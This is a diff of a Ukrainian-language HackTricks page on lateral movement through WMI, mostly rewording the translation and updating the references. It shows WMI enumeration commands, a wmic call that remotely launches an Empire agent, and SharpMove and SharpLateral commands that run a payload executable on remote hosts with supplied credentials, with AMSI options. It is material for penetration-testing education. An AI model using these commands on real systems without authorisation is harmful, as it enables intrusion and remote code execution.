@@ -2,18 +2,18 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Пояснення принципу роботи
+## Як це працює
 
-Процеси можна запускати на хостах, якщо відомі ім'я користувача та пароль або hash, використовуючи WMI. Команди виконуються через WMI за допомогою Wmiexec, що забезпечує можливість роботи в напівінтерактивному shell.
+Процеси можна відкривати на хостах, де відомі ім'я користувача та пароль або хеш, за допомогою WMI. Команди виконуються через WMI за допомогою Wmiexec, забезпечуючи напівінтерактивну роботу з shell.
 
-**dcomexec.py:** Використовуючи різні DCOM endpoints, цей script надає напівінтерактивний shell, подібний до wmiexec.py, з використанням об'єкта ShellBrowserWindow DCOM. Наразі підтримуються об'єкти MMC20. Application, Shell Windows і Shell Browser Window. (source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))<sup>[[2]](#references)</sup>
+**dcomexec.py:** Використовуючи різні кінцеві точки DCOM, цей скрипт забезпечує напівінтерактивну роботу з shell, подібну до `wmiexec.py`. Вибране значення `-object` визначає кінцеву точку; підтримувані об'єкти включають `MMC20.Application`, `ShellWindows` і `ShellBrowserWindow`, причому останній реалізує техніку Shell Browser Window, розглянуту в оригінальному walkthrough.<sup>[[2]](#references)[[3]](#references)</sup>
 
 ## Основи WMI
 
 ### Namespace
 
-WMI має ієрархію, структуровану за принципом каталогів. Його контейнером верхнього рівня є \root, у якому організовано додаткові каталоги, що називаються namespaces.<sup>[[1]](#references)</sup>
-Команди для перелічення namespaces:
+WMI має ієрархію, структуровану за принципом каталогів. Його контейнером верхнього рівня є \root, під яким організовані додаткові каталоги, що називаються namespaces.<sup>[[1]](#references)</sup>
+Команди для переліку namespaces:
 ```bash
 # Retrieval of Root namespaces
 gwmi -namespace "root" -Class "__Namespace" | Select Name
@@ -31,7 +31,7 @@ gwmi -Namespace "root/microsoft" -List -Recurse
 ```
 ### **Класи**
 
-Знання назви класу WMI, наприклад `win32_process`, і простору імен, у якому він знаходиться, є важливим для будь-якої операції WMI.  
+Знання назви класу WMI, наприклад win32_process, і простору імен, у якому він знаходиться, має вирішальне значення для будь-якої операції WMI.  
 Команди для виведення списку класів, що починаються з `win32`:
 ```bash
 Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
@@ -85,19 +85,19 @@ wmic useraccount list /format:list
 wmic group list /format:list
 wmic sysaccount list /format:list
 ```
-Віддалене отримання конкретної інформації через WMI, наприклад про локальних адміністраторів або користувачів, які увійшли в систему, можливе за умови ретельного формування команд.
+Віддалене опитування WMI для отримання певної інформації, наприклад локальних адміністраторів або користувачів, які ввійшли в систему, можливе за умови ретельного формування команд.
 
 ### **Ручне віддалене опитування WMI**
 
-Приховане визначення локальних адміністраторів на віддаленій машині та користувачів, які увійшли в систему, можна виконати за допомогою спеціальних WMI-запитів. `wmic` також підтримує читання з текстового файлу для одночасного виконання команд на кількох вузлах.<sup>[[1]](#references)</sup>
+Приховане визначення локальних адміністраторів на віддаленій машині та користувачів, які ввійшли в систему, можна здійснити за допомогою спеціальних WMI-запитів. `wmic` також підтримує зчитування команд із текстового файлу для одночасного виконання команд на кількох вузлах.<sup>[[1]](#references)</sup>
 
-Для віддаленого виконання процесу через WMI, наприклад розгортання агента Empire, використовується наведена нижче структура команди; успішне виконання позначається поверненим значенням `"0"`:<sup>[[1]](#references)</sup>
+Для віддаленого запуску процесу через WMI, наприклад розгортання агента Empire, використовується наведена нижче структура команди; про успішне виконання свідчить повернене значення `"0"`:<sup>[[1]](#references)</sup>
 ```bash
 wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
-Цей процес демонструє можливості WMI для віддаленого виконання та переліку системної інформації, підкреслюючи його корисність як для системного адміністрування, так і для penetration testing.
+Цей процес демонструє можливості WMI для віддаленого виконання та перерахування системи, підкреслюючи його корисність як для системного адміністрування, так і для penetration testing.
 
-## Автоматизовані інструменти
+## Автоматичні інструменти
 
 - [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 ```bash
@@ -115,13 +115,12 @@ SharpMove.exe action=query computername=remote.host.local query="select * from w
 SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
 SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
 ```
-- Також можна використати **`wmiexec` з Impacket**.
+- Ви також можете використати **Impacket's `wmiexec`**.
 
 
-## Посилання
+## References
 
-- [1] [Використання облікових даних для отримання контролю над Windows-системами — частина 3 (WMI і WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
-- [2] [Посібник для початківців із набору інструментів Impacket — частина 1](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
-
-
+- [1] [Використання облікових даних для захоплення Windows-систем — частина 3 (WMI та WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
+- [2] [Fortra Impacket — dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
+- [3] [Посібник для початківців з набору інструментів Impacket, частина 1 — Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
 {{#include ../../banners/hacktricks-training.md}}
